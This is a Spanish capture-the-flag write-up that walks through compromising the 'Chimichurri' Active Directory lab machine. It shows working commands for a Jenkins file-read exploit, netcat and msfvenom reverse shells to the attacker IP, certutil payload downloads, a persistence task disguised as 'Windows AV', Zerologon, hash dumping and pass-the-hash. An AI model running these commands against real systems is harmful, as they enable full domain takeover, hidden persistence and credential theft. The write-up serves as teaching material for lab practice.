---
title: "Chimichurri"
layout: "post"
categories: [ "The Hackers Labs", "THL - Principiante" ]
tags: [ "nmap", "ntpdate", "netexec", "smbmap", "Jenkins", "Path Traversal", "SeImpersonatePrivilege", "JuicyPotatoNG", "icacls", "msfvenom", "certutil", "schtasks", "Zerologon", "secretsdump", "evil-winrm-py" ]
---

## Info

![Chimichurri](/assets/posts/2026-08-20-chimichurri_thl/01_chimichurri.png)
*Chimichurri - The Hackers Labs (Easy)*

Chimichurri es una máquina de dificultad Easy de The Hackers Labs, enfocada en un entorno de Active Directory.

> La Cyber Kill Chain comienza con un **RID Cycling Attack** anónimo para enumerar usuarios del dominio, seguido del hallazgo de credenciales expuestas en un share SMB (`drogas`) que apuntan a un archivo con contraseñas en el escritorio del usuario `hacker`. Explotando un **path traversal en Jenkins** (`CVE-2024-23897`) leo dicho archivo y obtengo credenciales válidas por SMB y WinRM. Ya dentro, abuso de `SeImpersonatePrivilege` para realizar una **primera escalada de privilegios** con **JuicyPotatoNG** para obtener una shell como `NT AUTHORITY\SYSTEM`, ajusto las DACL de las flags para poder leerlas. Finalmente, se utiliza una **segunda vía de escalada de privilegios** mediante **Zerologon** (`CVE-2020-1472`) para resetear la contraseña de la cuenta de máquina del DC, volcar el `NTDS.dit` con `secretsdump` y autenticarme como `Administrador` mediante Pass-the-Hash.
{: .prompt-info }

## Descubrimiento de hosts

Comienzo la fase de reconocimiento realizando un descubrimiento de hosts activos mediante **ARP**.

```shell
sudo nmap -sn 10.10.10.0/24

Nmap scan report for 10.10.10.1
Host is up (0.00058s latency).
MAC Address: 00:50:56:C0:00:03 (VMware)
Nmap scan report for 10.10.10.147
Host is up (0.00019s latency).
MAC Address: 00:0C:29:22:29:5C (VMware)
Nmap scan report for 10.10.10.254
Host is up (0.00027s latency).
MAC Address: 00:50:56:FA:99:84 (VMware)
Nmap scan report for 10.10.10.138
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 5.94 seconds
```

| Host | IP |
|:---|:---:|
| **Attacker** | `10.10.10.138` |
| **Target** | `10.10.10.147` |

## Nmap

Comienzo realizando un escaneo completo de los puertos TCP para determinar la superficie de ataque disponible.

```shell
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.10.147 -oG allPorts

PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
6969/tcp  open  acmsoda
9389/tcp  open  adws
47001/tcp open  winrm

...SNIP...
```

El output mostrado revela la naturaleza del objetivo. La presencia de servicios como **DNS, Kerberos, LDAP, SMB, WinRm, etc** son característicos de un entorno de **Active Directory**, por lo que puedo inferir que me enfrento ante un **Domain Controller**.

**Parseo de puertos**

Realizo una pequeña RegEx para extraer los puertos abiertos del resultado anterior.
```shell
ports=$(cat allPorts | grep -oP '\d{1,5}(?=/open)' | xargs | tr ' ' ',')
```

> También puede utilizarse la función [extractPorts](https://pastebin.com/xNaZxRGA), añadiéndola previamente al archivo **.bashrc** o **.zshrc**.
{: .prompt-tip }

**Enumeración de versiones**

Ejecuto un segundo escaneo utilizando `-sC` y `-sV`.

```shell
sudo nmap -sCV -p$ports 10.10.10.147 -oN version

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-11 20:38:44Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: chimichurri.thl, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: chimichurri.thl, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
6969/tcp  open  http          Jetty 10.0.11
|_http-server-header: Jetty(10.0.11)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Panel de control [Jenkins]
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0

...SNIP...

Service Info: Host: CHIMICHURRI; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_nbstat: NetBIOS name: CHIMICHURRI, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:22:29:5c (VMware)
| smb2-time: 
|   date: 2026-08-11T20:39:32
|_  start_date: 2026-08-11T20:29:12
|_clock-skew: -6h00m00s
```

Como se observa, **la hora está bastante desincronizada, casi 6 horas** entre mi máquina y el objetivo. Por otro lado, la **firma SMB está habilitada y es requerida**, lo que impide realizar un **SMB Relay Attack** ;)

## Configuración inicial

Antes de comenzar con la enumeración y explotación de Active Directory, realizo dos ajustes en mi máquina atacante: **sincronizar el reloj con el DC y resolver correctamente los nombres del dominio**.

Ambos puntos son especialmente importantes cuando se trabaja con **Kerberos**, ya que el protocolo es sensible al desfase horario y utiliza nombres de host y dominio durante el proceso de autenticación.

### ntpdate

```shell
sudo ntpdate 10.10.10.147

11 Aug 15:41:58 ntpdate[8585]: step time server 10.10.10.147 offset -21600.355640 sec
```

### /etc/hosts

Utilizo **NetExec** para consultar el servicio SMB y generar automáticamente una entrada compatible con `/etc/hosts`.

```shell
nxc smb 10.10.10.147 --generate-hosts-file output

SMB         10.10.10.147    445    CHIMICHURRI      [*] Windows 10 / Server 2016 Build 14393 x64 (name:CHIMICHURRI) (domain:chimichurri.thl) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
```

El archivo `output` contiene los nombres relevantes del objetivo.

```
cat output | sudo tee -a /etc/hosts

10.10.10.147     CHIMICHURRI.chimichurri.thl chimichurri.thl CHIMICHURRI
```

## SMB (Null Session)

Comienzo con la enumeración por **SMB**. Al no contar con credenciales válidas, la enumeración inicial es limitada. Por ello intento aprovechar el acceso mediante una **sesión guest/NULL**.

### RID Cycling Attack

Usaré `netexec` para lanzar un ataque de fuerza bruta hacia los RID y obtener los usuarios válidos del DC; mediante esta RegEx filtro solo la salida para obtener únicamente los objetos de tipo usuario. Asimismo, almaceno el resultado en el archivo **userssmb**.

```shell
nxc smb chimichurri.thl -u guest -p "" --rid-brute | awk -F\\\\ '/User/ && !/Group/ {print $2}' | sed 's/ (SidTypeUser)//g' | tee -a userssmb

Administrador
Invitado
krbtgt
DefaultAccount
hacker
CHIMICHURRI$
```

Entre las cuentas enumeradas destaca **`hacker`**, que será especialmente interesante para las siguientes fases.

### SMB Shares

Continúo con el descubrimiento de shares.

```shell
nxc smb chimichurri.thl -u guest -p "" --shares

SMB         10.10.10.147    445    CHIMICHURRI      [+] chimichurri.thl\guest: (Guest)
SMB         10.10.10.147    445    CHIMICHURRI      [*] Enumerated shares
SMB         10.10.10.147    445    CHIMICHURRI      Share           Permissions            Remark
SMB         10.10.10.147    445    CHIMICHURRI      -----           -----------            ------
SMB         10.10.10.147    445    CHIMICHURRI      ADMIN$                                 Admin remota
SMB         10.10.10.147    445    CHIMICHURRI      C$                                     Recurso predeterminado
SMB         10.10.10.147    445    CHIMICHURRI      drogas          READ
SMB         10.10.10.147    445    CHIMICHURRI      IPC$            READ                   IPC remota
SMB         10.10.10.147    445    CHIMICHURRI      NETLOGON                               Recurso compartido del servidor de inicio de sesión
SMB         10.10.10.147    445    CHIMICHURRI      SYSVOL                                 Recurso compartido del servidor de inicio de sesión
```

Lo normal en un `DC`, pero hay uno no común.

| Share interesante | Permisos |
|:---|:---:|
| **drogas** | `READ` |

#### **drogas (xD?)**

Procedo a enumerar el contenido del recurso usando `smbmap`.

```shell
smbmap -H chimichurri.thl -u guest -p "" -r drogas --no-banner

	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	drogas                                            	READ ONLY
	./drogas
	fr--r--r--               95 Sun Jun 30 12:19:02 2024	credenciales.txt
```

Encuentro un archivo denominado `credenciales.txt`, descargo el archivo para inspeccionarlo.

```shell
smbmap -H chimichurri.thl -u guest -p "" --download drogas/credenciales.txt --no-banner

[+] Starting download: drogas\credenciales.txt (95 bytes)
[+] File output to: /home/f4dee/10.10.10.147-drogas_credenciales.txt
```

Al revisar su contenido.

```shell
cat 10.10.10.147-drogas_credenciales.txt

Todo es mejor en con el usuario hacker, en su escritorio estan sus claves de acceso como perico
```

La información encontrada proporciona una pista: las claves de acceso del usuario `hacker` se encuentran en su escritorio y la contraseña indicada es `perico`. Por tanto, obtengo unas posibles credenciales iniciales: **`hacker:perico`**

**Validación de credenciales**

El siguiente paso es comprobar si estas credenciales son válidas contra los servicios que podrían proporcionar acceso al sistema.

Comienzo probándolas contra **SMB**.

```shell
nxc smb chimichurri.thl -u hacker -p perico

SMB         10.10.10.147    445    CHIMICHURRI      [-] chimichurri.thl\hacker:perico STATUS_LOGON_FAILURE
```

La autenticación falla con `STATUS_LOGON_FAILURE`. Realizo la misma comprobación contra **WinRM**, pero tampoco obtengo un acceso válido.

Por el momento, `hacker:perico` no permite autenticarse directamente mediante SMB ni WinRM. Sin embargo, la pista encontrada en `credenciales.txt` indica que existe información adicional en el **escritorio del usuario `hacker`**, por lo que será necesario encontrar otra vía para acceder a ella.

## HTTP

### Web stack

Durante el reconocimiento de servicios identifiqué **Jenkins** expuesto en el puerto `6969`. Comienzo enumerando la aplicación con `WhatWeb` para identificar su *stack* y versión.

```shell
whatweb http://chimichurri.thl:6969

http://chimichurri.thl:6969 [200 OK] Cookies[JSESSIONID.c10dc5d2], HTML5, HTTPServer[Jetty(10.0.11)], Jenkins[2.361.4], Jetty[10.0.11], Title[Panel de control [Jenkins]]
```

La aplicación se encuentra ejecutando **Jenkins 2.361.4** sobre **Jetty 10.0.11**.

### CVE-2024-23897

Con la versión identificada, busco vulnerabilidades conocidas que puedan permitir acceder a archivos del sistema. Encuentro [CVE-2024-23897](https://www.cve.org/CVERecord?id=CVE-2024-23897), una vulnerabilidad de **lectura arbitraria de archivos** en Jenkins que afecta a determinadas versiones de la aplicación.

```shell
searchsploit -m 51993

  Exploit: Jenkins 2.441 - Local File Inclusion
      URL: https://www.exploit-db.com/exploits/51993
     Path: /usr/share/exploitdb/exploits/java/webapps/51993.py
    Codes: CVE-2024-23897
Copied to: /home/f4dee/Downloads/exploits/51993.py
```

> Más sobre CVE-2024-23897 [aquí](https://www.sonarsource.com/blog/excessive-expansion-uncovering-critical-security-vulnerabilities-in-jenkins/).
{: .prompt-info }

Antes de intentar acceder a información sensible, compruebo si la vulnerabilidad funciona leyendo un archivo conocido del sistema. En este caso, utilizo el archivo `hosts` de Windows.

```shell
python 51993.py -u http://chimichurri.thl:6969 -p '../../../windows/system32/drivers/etc/hosts'

# Copyright (c) 1993-2009 Microsoft Corp.
# space.
# entry should be kept on an individual line. The IP address should
#
# lines or following the machine name denoted by a '#' symbol.
# localhost name resolution is handled within DNS itself.
# Additionally, comments (such as these) may be inserted on individual
#       38.25.63.10     x.acme.com              # x client host
# be placed in the first column followed by the corresponding host name.
# For example:
# The IP address and the host name should be separated by at least one
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#	127.0.0.1       localhost
#	::1             localhost
#      102.54.94.97     rhino.acme.com          # source server
# This file contains the mappings of IP addresses to host names. Each
```

La respuesta contiene el contenido esperado del archivo, confirmando que puedo realizar una **lectura arbitraria de archivos** a través de Jenkins.

### Recuperación de credenciales

Confirmada la existencia de la vulnerabilidad. Sigo la pista vista en el share `drogas` y reviso la existencia de un archivo llamado `perico` en el escritorio de `hacker`.

> *"Todo es mejor en con el usuario hacker, en su escritorio estan sus claves de acceso como perico"*

```shell
python 51993.py -u http://chimichurri.thl:6969 -p '../../../Users/hacker/Desktop/perico.txt'

hacker:Perico69
```
## Validación de credenciales

Obtenidas credenciales válidas, procedo a validarlas contra SMB.

```shell
nxc smb chimichurri.thl -u hacker -p Perico69

SMB         10.10.10.147    445    CHIMICHURRI      [+] chimichurri.thl\hacker:Perico69
```

La autenticación es correcta. Finalmente, compruebo si estas mismas credenciales permiten el acceso remoto mediante **WinRM**.

```shell
nxc winrm chimichurri.thl -u hacker -p Perico69

WINRM       10.10.10.147    5985   CHIMICHURRI      [+] chimichurri.thl\hacker:Perico69 (Pwn3d!)
```

Las credenciales son válidas y, además, la cuenta `hacker` dispone de acceso mediante WinRM. Con esto, ya dispongo de un punto de entrada interactivo al sistema y puedo continuar con la enumeración local de privilegios.

## Sesión como hacker

Con las credenciales obtenidas anteriormente, accedo al sistema mediante **WinRM** utilizando `evil-winrm-py`.

```shell
evil-winrm-py -i chimichurri.thl -u hacker -p Perico69
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.6.0

[*] Connecting to 'chimichurri.thl:5985' as 'hacker'
evil-winrm-py PS C:\Users\hacker\Documents> whoami
chimichurri0\hacker
```

Una vez dentro, reviso el escritorio del usuario. Encuentro tanto el archivo `perico.txt`, que ya había identificado mediante la vulnerabilidad de Jenkins, como `user.txt`.

```powershell
dir -Force


    Directorio: C:\Users\hacker\Desktop


Mode                LastWriteTime         Length Name                                                                   
----                -------------         ------ ----                                                                   
-a-hs-        6/24/2024   6:40 PM            282 desktop.ini                                                            
-a----        6/30/2024   7:19 PM             15 perico.txt                                                             
-a----        6/27/2024  12:57 PM             29 user.txt
```
Ahora puedo obtener ¿`user.txt`?

```powershell
type user.txt

Access to the path 'C:\Users\hacker\Desktop\user.txt' is denied.
```

La respuesta es clara, por el momento **NO**. Reviso las ACL del archivo. 

```powershell
icacls user.txt

Se procesaron correctamente 0 archivos; error al procesar 1 archivos
user.txt: Acceso denegado.
```

Bien, pues entonces continúo con la enumeración local en busca de una vía para **escalar privilegios**.

## PrivEsc \(Method 1\)

### Enumeración de privilegios

Reviso mis privilegios actuales.

```powershell
whoami /priv

Nombre de privilegio          Descripci¢n                                  Estado
============================= ============================================ ==========
SeMachineAccountPrivilege     Agregar estaciones de trabajo al dominio     Habilitada
SeChangeNotifyPrivilege       Omitir comprobaci¢n de recorrido             Habilitada
SeImpersonatePrivilege        Suplantar a un cliente tras la autenticaci¢n Habilitada
SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Habilitada
```

> La cuenta dispone de [SeImpersonatePrivilege](https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege), un privilegio especialmente interesante en escenarios de escalada local en Windows. Este privilegio permite que un proceso suplante el contexto de seguridad de un cliente después de su autenticación y ha sido históricamente aprovechado por diferentes técnicas de la familia **Potato** para obtener un token privilegiado.
{: .prompt-danger }

### Abusando de SeImpersonatePrivilege

En versiones modernas de Windows, el `JuicyPotato` original dejó de ser una alternativa fiable debido a cambios en los mecanismos de activación COM/DCOM. Existen otras técnicas y herramientas como `PrintSpoofer`, `RoguePotato`, `GodPotato`, `JuicyPotatoNG`, `SigmaPotato (fork de GodPotato)`, etc., cuya compatibilidad depende de la versión concreta de Windows y del contexto en el que se encuentre el privilegio.

> Puedes consultar más en [HackTricks](https://hacktricks.wiki/es/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer.html#roguepotato-printspoofer-sharpefspotato-godpotato)
{: .prompt-info }

#### JuicyPotatoNG

En este caso, tras probar diferentes alternativas de la familia **Potato**, las condiciones del entorno no permiten utilizar de forma fiable los binarios mencionados anteriormente. Por ello, opto por utilizar [JuicyPotatoNG](https://github.com/antonioCoco/JuicyPotatoNG) desarrollado por **antonioCoco**, junto con [netcat](https://eternallybored.org/misc/netcat/), para obtener una shell bajo el contexto de **`NT AUTHORITY\SYSTEM`**.

Descargo los binarios en mi máquina atacante.

```shell
wget -q https://github.com/antonioCoco/JuicyPotatoNG/releases/download/v1.1/JuicyPotatoNG.zip
unzip JuicyPotatoNG.zip

wget -q https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip
unzip netcat-win32-1.11.zip
```

Creo un directorio temporal en el objetivo para almacenar los ejecutables.

```powershell
mkdir C:\Windows\Temp\privesc
```

Inicio un servidor HTTP en mi máquina atacante.

```shell
sudo python3 -m http.server 80                                                         
[sudo] password for f4dee: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) …
```

Desde la sesión de WinRM utilizo `certutil` para descargar ambos binarios:

```powershell
certutil -f -urlcache -split http://10.10.10.138/nc64.exe

****  En línea  ****
  0000  ...
  aab0
CertUtil: -URLCache comando completado correctamente.
```

```powershell
certutil -f -urlcache -split http://10.10.10.138/JuicyPotatoNG.exe

****  En línea  ****
  000000  ...
  025800
CertUtil: -URLCache comando completado correctamente.
```

Preparo un listener en el puerto `443`.

```shell
sudo rlwrap -cAr nc -lnvp 443

Listening on 0.0.0.0 443
```

Finalmente, ejecuto `JuicyPotatoNG`, utilizando `nc64.exe` como proceso encargado de devolverme una shell a mi listener.

```powershell
.\JuicyPotatoNG.exe -t * -p .\nc64.exe -a "10.10.10.138 443 -e cmd.exe"
```

Recibo una conexión entrante.

```shell
sudo rlwrap -cAr nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.10.150 50958
Microsoft Windows [Versi n 10.0.14393]
(c) 2016 Microsoft Corporation. Todos los derechos reservados.

C:\>whoami
whoami
nt authority\system
```

La explotación ha sido exitosa y ahora dispongo de una shell como **`NT AUTHORITY\SYSTEM`**.

### Ahora sí: ¿user.txt y root.txt?

Con privilegios elevados, busco las flags dentro de los perfiles de usuario.

```powershell
where /R C:\Users user.txt

C:\Users\hacker\Desktop\user.txt
```
```powershell
where /R C:\Users root.txt

C:\Users\Administrador\Desktop\root.txt
```

Sin embargo, aún bajo el contexto de `NT AUTHORITY\SYSTEM`, sigo obteniendo un error de acceso.

```powershell
type C:\Users\hacker\Desktop\user.txt
Acceso denegado.
```
```powershell
type C:\Users\Administrador\Desktop\root.txt
Acceso denegado.
```

Esto resulta interesante, ya que `SYSTEM` posee el máximo nivel de privilegio del sistema operativo. Por tanto, el problema no parece estar relacionado con el [nivel de integridad del proceso](https://redcanary.com/blog/threat-detection/better-know-a-data-source/process-integrity-levels/), sino con las **ACL/DACL específicas de los archivos**.

### Modificando las ACL

Ahora que tengo una shell privilegiada, puedo consultar las ACL de ambos archivos.

```powershell
icacls C:\Users\hacker\Desktop\user.txt

C:\Users\hacker\Desktop\user.txt CHIMICHURRI0\Administrador:(RX)
```
```powershell
icacls C:\Users\Administrador\Desktop\root.txt

C:\Users\Administrador\Desktop\root.txt CHIMICHURRI0\Administrador:(RX)
```

[Ajá](https://www.rae.es/diccionario-estudiante/aj%C3%A1), las ACL muestran que únicamente `CHIMICHURRI0\Administrador` dispone de **permisos de lectura y ejecución** sobre los archivos.

Como `SYSTEM` tiene capacidad para modificar las ACL, simplemente es cuestión de conceder explícitamente **Full Control (`F`)** a `NT AUTHORITY\SYSTEM`.

```powershell
icacls C:\Users\Administrador\Desktop\root.txt /grant "NT AUTHORITY\SYSTEM":f

archivo procesado: C:\Users\Administrador\Desktop\root.txt
Se procesaron correctamente 1 archivos; error al procesar 0 archivos
```
```powershell
icacls C:\Users\hacker\Desktop\user.txt /grant "NT AUTHORITY\SYSTEM":f

archivo procesado: C:\Users\hacker\Desktop\user.txt
Se procesaron correctamente 1 archivos; error al procesar 0 archivos
```

Una vez modificadas las DACL, ya puedo acceder a ambas flags.

### user.txt & root.txt

Finalmente puedo obtener el contenido de ambas flags ;D

```powershell
type C:\Users\hacker\Desktop\user.txt
<NOTHING INTEREST HERE>

type C:\Users\Administrador\Desktop\root.txt
<NOTHING INTEREST HERE>
```

Con esto completo la primera ruta de escalada: **`hacker` → `SeImpersonatePrivilege` → JuicyPotatoNG → `SYSTEM` → modificación de DACL → flags**.

### Persistencia (Scheduled Tasks)

Como ejercicio adicional, también puedo establecer persistencia mediante una [scheduled task](https://learn.microsoft.com/en-us/windows/win32/taskschd/about-the-task-scheduler) que ejecute periódicamente una reverse shell bajo el contexto de `SYSTEM`.

#### msfvenom

Genero un [*payload stageless*](https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/) con `msfvenom`.

```shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.138 LPORT=9001 -f exe > WindowsAV.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 7168 bytes
```

Aprovecho el servidor HTTP iniciado anteriormente, y desde la sesión `SYSTEM`, descargo el payload al sistema.

```powershell
certutil -f -urlcache -split http://10.10.10.138/WindowsAV.exe C:\Windows\WindowsAV.exe

****  En l nea  ****
  0000  ...
  1c00
CertUtil: -URLCache comando completado correctamente.
```

#### Creación de scheduled task

Creo una tarea programada que ejecute el binario cada minuto bajo la cuenta `SYSTEM`.

```powershell
schtasks /create /sc minute /mo 1 /tn "Windows AV" /tr "cmd.exe /c C:\Windows\WindowsAV.exe" /ru "SYSTEM"

Correcto: se cre  correctamente la tarea programada "Windows AV".
```

Puedo verificar la **scheduled task "Windows AV"**.

```powershell
schtasks /query /v /tn "Windows AV" /fo LIST

Carpeta: \
Nombre de host:                                        CHIMICHURRI
Nombre de tarea:                                       \Windows AV
Hora pr xima ejecuci n:                                12/08/2026 21:59:00
Estado:                                                Ejecut ndose
Modo de inicio de sesi n:                              Interactivo/En segundo plano
 ltimo tiempo de ejecuci n:                            12/08/2026 21:58:00
 ltimo resultado:                                      -2147020576
Autor:                                                 CHIMICHURRI0\CHIMICHURRI$
Tarea que se ejecutar :                                cmd.exe /c C:\Windows\WindowsAV.exe
Iniciar en:                                            No disponible
Comentario:                                            No disponible
Estado de tarea programada:                            Habilitada
Tiempo de inactividad:                                 Deshabilitado
Administraci n de energ a:                             Detener en modo Bater a, No iniciar en Bater a
Ejecutar como usuario:                                 SYSTEM
Eliminar tarea si no se vuelve a programar:            Deshabilitado
Eliminar tarea si ejecuta durante X horas y X minutos: 72:00:00
Programaci n:                                          Datos de programaci n no disponibles en este formato.
Tipo de programaci n:                                  Solo una vez, Minuto
Hora de inicio:                                        21:23:00
Fecha de inicio:                                       12/08/2026
Fecha final:                                           No disponible
D as:                                                  No disponible
Meses:                                                 No disponible
Repetir: cada:                                         0 hora(s), 1 minuto(s)
Repetir: hasta: hora:                                  Ninguno
Repetir: hasta: duraci n:                              Deshabilitado
Repetir: detener si a n se ejecuta:                    Deshabilitado
```

#### Shell como NT AUTHORITY\SYSTEM

Después de esperar al siguiente intervalo de ejecución, recibo una conexión.

```powershell
rlwrap -cAr nc -lnvp 9001

Listening on 0.0.0.0 9001
Connection received on 10.10.10.148 50061
Microsoft Windows [Versi n 10.0.14393]
(c) 2016 Microsoft Corporation. Todos los derechos reservados.

C:\Windows\system32>whoami
whoami
nt authority\system
```

> Esta parte es **completamente opcional y NO es necesaria** para completar la máquina, por lo que la considero únicamente como una demostración adicional de persistencia.
{: .prompt-tip }

## PrivEsc \(Method 2\)

### Zerologon (CVE-2020-1472)

Además de la escalada local mediante `SeImpersonatePrivilege`, existe una segunda vía para comprometer el **Domain Controller**.

Una vulnerabilidad especialmente relevante en este escenario es [Zerologon (CVE-2020-1472)](https://www.cve.org/CVERecord?id=CVE-2020-1472), que afecta al protocolo **Netlogon Remote Protocol (MS-NRPC)**. Su explotación permite, bajo determinadas condiciones, establecer una contraseña conocida (normalmente una cadena vacía) para la cuenta de máquina del Domain Controller.

Compruebo si el objetivo es vulnerable utilizando el módulo correspondiente de NetExec.

```shell
nxc smb chimichurri.thl -u guest -p "" -M zerologon

ZEROLOGON   10.10.10.147    445    CHIMICHURRI      VULNERABLE
ZEROLOGON   10.10.10.147    445    CHIMICHURRI      Next step: https://github.com/dirkjanm/CVE-2020-1472
```

El resultado confirma que **CHIMICHURRI es vulnerable a Zerologon**.

> Zerologon es una vulnerabilidad crítica de Netlogon. Su explotación puede alterar la contraseña de la cuenta de máquina del Domain Controller, por lo que esta técnica debe reservarse para laboratorios, CTFs o entornos específicamente autorizados.
{: .prompt-danger }

> Para una explicación más detallada de Zerologon, puede consultarse el [análisis de 0xdf](https://0xdf.gitlab.io/2020/09/17/zerologon-owning-htb-machines-with-cve-2020-1472.html).
{: .prompt-tip }

Antes de explotar la vulnerabilidad, compruebo si puedo utilizar la cuenta de máquina `CHIMICHURRI$` para realizar un [DCSync Attack](https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync) y obtener los secretos de Active Directory.

```shell
secretsdump.py -no-pass -just-dc 'CHIMICHURRI$@chimichurri.thl'

Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: SMB SessionError: code: 0xc000006d - STATUS_LOGON_FAILURE - The attempted logon is invalid. This is either due to a bad username or authentication information.
[*] Cleaning up...
```

Como era de esperar, la autenticación falla.

### Explotación de Zerologon

Clono el repositorio público utilizado para explotar `CVE-2020-1472`.

```shell
git clone https://github.com/dirkjanm/CVE-2020-1472
```

Ejecuto el exploit indicando el nombre NetBIOS del Domain Controller y su dirección IP.

```shell
python cve-2020-1472-exploit.py CHIMICHURRI 10.10.10.147

Performing authentication attempts...
======================================================================================
Target vulnerable, changing account password to empty string

Result: 0

Exploit complete!
```

La explotación se completa correctamente y la contraseña de la cuenta de máquina del DC ha sido establecida a una cadena vacía.

### Extracción de `NTDS.dit`

Vuelvo a ejecutar `secretsdump` utilizando la cuenta de máquina.

```shell
secretsdump.py -no-pass -just-dc 'CHIMICHURRI$@chimichurri.thl'

Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrador:500:aad3b435b51404eeaad3b435b51404ee:058a4c99bab8b3d04a6bd959f95ce2b2:::
Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a56c98cb518afcee50a23f25954575e1:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
hacker:1000:aad3b435b51404eeaad3b435b51404ee:6e7107c02923f27aae0a58e701db47e3:::
CHIMICHURRI$:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

...SNIP...

[*] Cleaning up...
```

La extracción mediante **DRSUAPI** permite recuperar los secretos almacenados en Active Directory, incluyendo los hashes NTLM de las cuentas del dominio. Entre ellos se encuentra el hash de `Administrador`.

### Pass-the-Hash

Con el hash obtenido puedo realizar un **Pass-the-Hash** contra SMB sin necesidad de conocer la contraseña en texto claro.

Valido el hash del `Administrador`.

```shell
nxc smb chimichurri.thl -u Administrador -H 058a4c99bab8b3d04a6bd959f95ce2b2
SMB         10.10.10.148    445    CHIMICHURRI      [*] Windows 10 / Server 2016 Build 14393 x64 (name:CHIMICHURRI) (domain:chimichurri.thl) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.10.10.148    445    CHIMICHURRI      [+] chimichurri.thl\Administrador:058a4c99bab8b3d04a6bd959f95ce2b2 (Pwn3d!)
```

La autenticación es exitosa y la cuenta dispone de privilegios administrativos, por lo que puedo usar `psexec` o obtener una sesión interactiva mediante `evil-winrm-py`.

```shell
evil-winrm-py -i chimichurri.thl -u Administrador -H 058a4c99bab8b3d04a6bd959f95ce2b2
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.6.0

[*] Connecting to 'chimichurri.thl:5985' as 'Administrador'
evil-winrm-py PS C:\Users\Administrador\Documents> whoami
chimichurri0\administrador
```

Ya tengo una sesión como **`Administrador`**. En consecuencia, puedo acceder directamente a ambas flags sin necesidad de modificar sus ACL.

```powershell
type C:\Users\hacker\Desktop\user.txt
<NOTHING INTEREST HERE>

type C:\Users\Administrador\Desktop\root.txt
<NOTHING INTEREST HERE>
```

De esta forma, la segunda ruta de escalada queda resumida como: **Guest → Zerologon (`CVE-2020-1472`) → cuenta de máquina del DC → `secretsdump` → hash NTLM de `Administrador` → Pass-the-Hash → acceso administrativo.**

Esta segunda vía resulta especialmente interesante porque, a diferencia de la primera, no requiere aprovechar `SeImpersonatePrivilege` ni ejecutar código localmente como `SYSTEM`: permite comprometer directamente las credenciales del **Domain Controller**.
